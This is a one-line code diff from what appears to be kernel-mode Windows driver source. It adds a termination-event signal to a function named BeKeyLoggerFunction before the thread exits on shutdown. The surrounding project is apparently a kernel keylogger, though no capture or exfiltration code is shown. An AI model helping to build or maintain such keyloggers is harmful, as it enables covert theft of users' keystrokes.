@@ -468,6 +468,7 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 		
 		if (BeGlobals::shutdown)
 		{
+            KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
 			PsTerminateSystemThread(STATUS_SUCCESS);
 		}
 
